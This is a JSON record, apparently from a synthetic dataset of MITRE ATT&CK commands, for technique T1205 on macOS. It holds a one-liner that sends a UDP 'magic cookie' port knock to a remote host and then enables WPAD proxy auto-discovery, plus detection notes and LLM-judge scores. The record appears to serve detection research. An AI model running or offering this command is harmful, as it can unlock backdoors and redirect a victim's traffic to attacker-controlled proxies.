@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "python3 -c 'from scapy.all import IP,UDP,Raw,send; send(IP(dst=\"203.0.113.10\")/UDP(dport=40000)/Raw(load=b\"KNOCK\\x01\\x02\\x03\"))' && networksetup -setproxyautodiscovery \"Wi-Fi\" on",
+  "explanation": "Sends a single-packet UDP 'magic cookie' knock to a remote listener and then enables proxy auto-discovery for subsequent traffic redirection. Detection: NIDS signatures for unusual small UDP payloads to uncommon ports and tracking of WPAD state changes.",
+  "rationale_steps": [
+    "Use scapy to send a UDP packet with a recognizable magic payload to port 40000.",
+    "The remote host uses the payload to validate and unlock access or open a port.",
+    "Enable WPAD to acquire proxy settings controlled by the attacker.",
+    "Detect via IDS for magic-cookie patterns and via configuration audits for WPAD toggles."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-eb4d6e52",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and parentheses with a valid Python Scapy one-liner chained via && to a correctly formed networksetup flag.",
+        "semantic_score": 3,
+        "semantic_justification": "The UDP 'magic cookie' knock matches T1205 traffic signaling, but on macOS Scapy raw packet sending and changing proxy autodiscovery typically require elevated privileges, so without them the actions are unlikely to succeed.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T18:32:26.418475Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, and valid tool arguments for both the Python Scapy script and the networksetup utility.",
+        "semantic_score": 3,
+        "semantic_justification": "While the Scapy portion correctly sends a traffic signal as described by T1205, the subsequent `networksetup` command requires administrative privileges on macOS, making the full claimed intent unachievable under the specified 'Privilege: None'.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T18:32:45.604405Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
